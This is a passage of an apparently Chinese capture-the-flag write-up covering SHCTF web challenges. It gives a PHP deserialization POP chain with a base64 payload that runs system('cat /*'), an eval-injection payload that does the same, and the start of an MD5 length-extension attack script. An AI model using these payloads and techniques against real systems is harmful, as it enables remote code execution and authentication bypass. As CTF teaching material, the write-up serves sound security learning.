class="line">    public $n; </span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__destruct</span>(<span class="params"></span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="attr">SH</span>::$Web = <span class="literal">true</span>; </span><br><span class="line">        echo $this-&gt;n; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">F</span> &#123; </span><br><span class="line">    public $o; </span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__toString</span>(<span class="params"></span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="attr">SH</span>::$SHCTF = <span class="literal">true</span>; </span><br><span class="line">        $this-&gt;o-&gt;<span class="title function_">flag</span>(); </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;其实。。。。,&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SHCTF</span> &#123; </span><br><span class="line">    public $isyou; </span><br><span class="line">    public $flag; </span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__invoke</span>(<span class="params"></span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="attr">SH</span>::$Web) &#123; </span><br><span class="line"></span><br><span class="line">            ($this-&gt;isyou)($this-&gt;flag); </span><br><span class="line">            echo <span class="string">&quot;小丑竟是我自己呜呜呜~&quot;</span>; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            echo <span class="string">&quot;小丑别看了!&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_">isset</span>($_GET[<span class="string">&#x27;data&#x27;</span>])) &#123; </span><br><span class="line">    <span class="title function_">highlight_file</span>(__FILE__); </span><br><span class="line">    <span class="title function_">unserialize</span>(<span class="title function_">base64_decode</span>($_GET[<span class="string">&#x27;data&#x27;</span>])); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_">highlight_file</span>(__FILE__); </span><br><span class="line">    echo <span class="string">&quot;小丑离我远点！！！&quot;</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个就是一个序列化题，没有什么好讲的</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SH</span> &#123;</span><br><span class="line">    public <span class="keyword">static</span> $Web = <span class="literal">false</span>;</span><br><span class="line">    public <span class="keyword">static</span> $SHCTF = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> &#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">T</span>&#123;</span><br><span class="line">    public $n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">F</span> &#123;</span><br><span class="line">    public $o;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SHCTF</span> &#123;</span><br><span class="line">    public $isyou=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">    public $flag=<span class="string">&quot;cat /*&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> <span class="title function_">T</span>();</span><br><span class="line">$a-&gt;n=<span class="keyword">new</span> <span class="title function_">F</span>();</span><br><span class="line">$a-&gt;n-&gt;o=<span class="keyword">new</span> <span class="title function_">C</span>();</span><br><span class="line">$a-&gt;n-&gt;o-&gt;p=<span class="keyword">new</span> <span class="title function_">SHCTF</span>();</span><br><span class="line">echo <span class="title function_">base64_encode</span>(<span class="title function_">serialize</span>($a));</span><br><span class="line"><span class="title class_">TzoxOiJUIjoxOntzOjE6Im4</span>iO086MToiRiI6MTp7czoxOiJvIjtPOjE6IkMiOjE6e3M6MToicCI7Tzo1OiJTSENURiI6Mjp7czo1OiJpc3lvdSI7czo2OiJzeXN0ZW0iO3M6NDoiZmxhZyI7czo2OiJjYXQgLyoiO319fX0=</span><br></pre></td></tr></table></figure>
<h3 id="Week1-单身十八年的手速"><a href="#Week1-单身十八年的手速" class="headerlink" title="[Week1] 单身十八年的手速"></a>[Week1] 单身十八年的手速</h3><p>查看game.js直接寻找最后的base编码得flag</p>
<h3 id="Week1-蛐蛐-蛐蛐"><a href="#Week1-蛐蛐-蛐蛐" class="headerlink" title="[Week1] 蛐蛐?蛐蛐!"></a>[Week1] 蛐蛐?蛐蛐!</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;ququ&#x27;</span>] == <span class="number">114514</span> &amp;&amp; <span class="title function_">strrev</span>($_GET[<span class="string">&#x27;ququ&#x27;</span>]) != <span class="number">415411</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">&#x27;ququ&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">        $eval_param = $_POST[<span class="string">&#x27;ququ&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_">strncmp</span>($eval_param,<span class="string">&#x27;ququk1&#x27;</span>,<span class="number">6</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">eval</span>($_POST[<span class="string">&#x27;ququ&#x27;</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_">echo</span>(<span class="string">&quot;可以让fault的蛐蛐变成现实么\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">echo</span>(<span class="string">&quot;蛐蛐成功第一步！\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_">echo</span>(<span class="string">&quot;呜呜呜fault还是要出题&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里直接通过提交ququ=114514a即可绕过第一个if,后面的if需要ququk1开头，但是直接拼接命令再后面即可,报错但是会执行</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ququ=ququk1;<span class="title function_">system</span>(<span class="string">&#x27;cat /*&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="Week2-MD5-GOD"><a href="#Week2-MD5-GOD" class="headerlink" title="[Week2]MD5 GOD!"></a>[Week2]MD5 GOD!</h3><p>下载源码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib, os, random</span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line">app.<span class="property">config</span>[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;Th1s_is_5ecr3t_k3y&quot;</span></span><br><span class="line">salt = os.<span class="title function_">urandom</span>(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">def <span class="title function_">md5</span>(data):</span><br><span class="line">    <span class="keyword">return</span> hashlib.<span class="title function_">md5</span>(data).<span class="title function_">hexdigest</span>().<span class="title function_">encode</span>()</span><br><span class="line"></span><br><span class="line">def <span class="title function_">check_sign</span>(sign, username, msg, salt):</span><br><span class="line">    <span class="keyword">if</span> sign == <span class="title function_">md5</span>(salt + msg + username):</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">False</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">getRandom</span>(str_length=<span class="number">16</span>):</span><br><span class="line">    <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    生成一个指定长度的随机字符串</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    random_str =<span class="string">&#x27;&#x27;</span></span><br><span class="line">    base_str =<span class="string">&#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line">    length =<span class="title function_">len</span>(base_str) -<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(str_length):</span><br><span class="line">        random_str +=base_str[random.<span class="title function_">randint</span>(<span class="number">0</span>, length)]</span><br><span class="line">    <span class="keyword">return</span> random_str</span><br><span class="line"></span><br><span class="line">users = &#123;&#125;</span><br><span class="line">sign_users = &#123;&#125;</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">def <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> session.<span class="title function_">get</span>(<span class="string">&#x27;sign&#x27;</span>) == <span class="title class_">None</span> or session.<span class="title function_">get</span>(<span class="string">&#x27;username&#x27;</span>) == <span class="title class_">None</span> or session.<span class="title function_">get</span>(<span class="string">&#x27;msg&#x27;</span>) == <span class="title class_">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    sign = session.<span class="title function_">get</span>(<span class="string">&#x27;sign&#x27;</span>)</span><br><span class="line">    username = session.<span class="title function_">get</span>(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    msg = session.<span class="title function_">get</span>(<span class="string">&#x27;msg&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">check_sign</span>(sign, username, msg, salt):</span><br><span class="line">        sign_users[username.<span class="title function_">decode</span>()] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;签到成功&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">redirect</span>(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>])</span><br><span class="line">def <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.<span class="property">form</span>.<span class="title function_">get</span>(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.<span class="property">form</span>.<span class="title function_">get</span>(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        # <span class="title function_">print</span>(password)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users and users[username] == <span class="attr">password</span>:</span><br><span class="line">            session[<span class="string">&quot;username&quot;</span>] = username.<span class="title function_">encode</span>()</span><br><span class="line">            session[<span class="string">&quot;msg&quot;</span>] = <span class="title function_">md5</span>(salt + password.<span class="title function_">encode</span>())</span><br><span class="line">            session[<span class="string">&quot;sign&quot;</span>] = <span class="title function_">md5</span>(salt + <span class="title function_">md5</span>(salt + password.<span class="title function_">encode</span>()) + username.<span class="title function_">encode</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;登陆成功&quot;</span></span><br><span class="line">        <span class="attr">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;登陆失败&quot;</span></span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">render_template</span>(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/users&quot;</span>)</span><br><span class="line">def <span class="title function_">user</span>():</span><br><span class="line">    <span class="keyword">return</span> json.<span class="title function_">dumps</span>(sign_users)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">def <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> <span class="attr">users</span>:</span><br><span class="line">        <span class="keyword">if</span> sign_users[user] != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;flag&#123;杂鱼~&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).<span class="title function_">read</span>()</span><br><span class="line"></span><br><span class="line">def <span class="title function_">init</span>():</span><br><span class="line">    <span class="variable language_">global</span> users, sign_users</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">64</span>):</span><br><span class="line">        username = <span class="title function_">getRandom</span>(<span class="number">8</span>)</span><br><span class="line">        pwd = <span class="title function_">getRandom</span>(<span class="number">16</span>)</span><br><span class="line">        users[username] = pwd</span><br><span class="line">        sign_users[username] = <span class="number">0</span></span><br><span class="line">    users[<span class="string">&quot;student&quot;</span>] = <span class="string">&quot;student&quot;</span></span><br><span class="line">    sign_users[<span class="string">&quot;student&quot;</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">init</span>()</span><br></pre></td></tr></table></figure>
<p>这里需要将每一个用户进行签到成功就可以获取flag，这里将SECRET_KEY给出来的，并且有一个关键函数来对身份进行验证</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">check_sign</span>(sign, username, msg, salt):</span><br><span class="line">    <span class="keyword">if</span> sign == <span class="title function_">md5</span>(salt + msg + username):</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">False</span></span><br></pre></td></tr></table></figure>
<p>salt为随机不知道的值，msg= md5(salt + password.encode())，但是有一个已经知道的账户，通过哈希延长攻击来写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Any</span>, <span class="type">Dict</span>, <span class="type">List</span></span><br><span class="line"></span><br><span class="line">rotate_amounts = [<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,</span><br><span class="line">                  <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,</span><br><span class="line">                  <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,</span><br><span class="line">                  <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>]</span><br><span class="line"></span><br><span class="line">constants = [<span class="built_in">int</span>(<span class="built_in">abs</span>(math.sin(i + <span class="number">1</span>)) * <span class="number">2</span> ** <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line">functions = <span class="number">16</span> * [<span class="keyword">lambda</span> b, c, d: (b &amp; c) | (~b &amp; d)] + \</span><br><span class="line">            <span class="number">16</span> * [<span class="keyword">lambda</span> b, c, d: (d &amp; b) | (~d &amp; c)] + \</span><br><span class="line">            <span class="number">16</span> * [<span class="keyword">lambda</span> b, c, d: b ^ c ^ d] + \</span><br><span class="line">            <span class="number">16</span> * [<span class="keyword">lambda</span> b, c, d: c ^ (b | ~d)]</span><br><span class="line"></span><br><span class="line">index_functions = <span class="number">16</span> * [<span class="keyword">lambda</span> i: i] + \</span><br><span class="line">                  <span class="number">16</span> * [<span class="keyword">lambda</span> i: (<span class="number">5</span> * i + <span class="number">1</span>) % <span class="number">16</span>] + \</span><br><span class="line">                  <span class="number">16</span> * [<span class="keyword">lambda</span> i: (<span class="number">3</span> * i + <span class="number">5</span>) % <span class="number">16</span>] + \</span><br><span class="line">                  <span class="number">16</span> * [<span class="keyword">lambda</span> i: (<span class="number">7</span> * i) % <span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_init_values</span>(<span class="params">A: <span class="built_in">int</span> = <span class="number">0x67452301</span>, B: <span class="built_in">int</span> = <span class="number">0xefcdab89</span>, C: <span class="built_in">int</span> = <span class="number">0x98badcfe</span>, D: <span class="built_in">int</span> = <span class="number">0x10325476</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">return</span> [A, B, C, D]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">left_rotate</span>(<span class="params">x, amount</span>):</span><br><span class="line">    x &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; amount) | (x &gt;&gt; (<span class="number">32</span> - amount))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding_message</span>(<span class="params">msg: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    在MD5算法中，首先需要对输入信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行，即使其位长对512求余的结果等于448。</span></span><br><span class="line"><span class="string">    因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。</span></span><br><span class="line"><span class="string">    填充的方法如下：</span></span><br><span class="line"><span class="string">        1) 在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。</span></span><br><span class="line"><span class="string">        2) 在这个结果后面附加一个以64位二进制表示的填充前信息长度（单位为Bit），如果二进制表示的填充前信息长度超过64位，则取低64位。</span></span><br><span class="line"><span class="string">    经过这两步的处理，信息的位长=N*512+448+64=(N+1）*512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    orig_len_in_bits = (<span class="number">8</span> * <span class="built_in">len</span>(msg)) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">    msg += <span class="built_in">bytes</span>([<span class="number">0x80</span>])</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(msg) % <span class="number">64</span> != <span class="number">56</span>:</span><br><span class="line">        msg += <span class="built_in">bytes</span>([<span class="number">0x00</span>])</span><br><span class="line">    msg += orig_len_in_bits.to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">message: <span class="built_in">bytes</span>, A: <span class="built_in">int</span> = <span class="number">0x67452301</span>, B: <span class="built_in">int</span> = <span class="number">0xefcdab89</span>, C: <span class="built_in">int</span> = <span class="number">0x98badcfe</span>, D: <span class="built_in">int</span> = <span class="number">0x10325476</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    message = padding_message(message)</span><br><span class="line">    hash_pieces = get_init_values(A, B, C, D)[:]</span><br><span class="line">    <span class="keyword">for</span> chunk_ofst <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(message), <span class="number">64</span>):</span><br><span class="line">        a, b, c, d = hash_pieces</span><br><span class="line">        chunk = message[chunk_ofst:chunk_ofst + <span class="number">64</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">            f = functions[i](b, c, d)</span><br><span class="line">            g = index_functions[i](i)</span><br><span class="line">            to_rotate = a + f + constants[i] + <span class="built_in">int</span>.from_bytes(chunk[<span class="number">4</span> * g:<span class="number">4</span> * g + <span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            a, b, c, d = d, new_b, b, c</span><br><span class="line">        <span class="keyword">for</span> i, val <span class="keyword">in</span> <span class="built_in">enumerate</span>([a, b, c, d]):</span><br><span class="line">            hash_pieces[i] += val</span><br><span class="line">            hash_pieces[i] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(x &lt;&lt; (<span class="number">32</span> * i) <span class="keyword">for</span> i, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(hash_pieces))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_to_hex</span>(<span class="params">digest: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    raw = digest.to_bytes(<span class="number">16</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;:032x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>.from_bytes(raw, byteorder=<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_md5</span>(<span 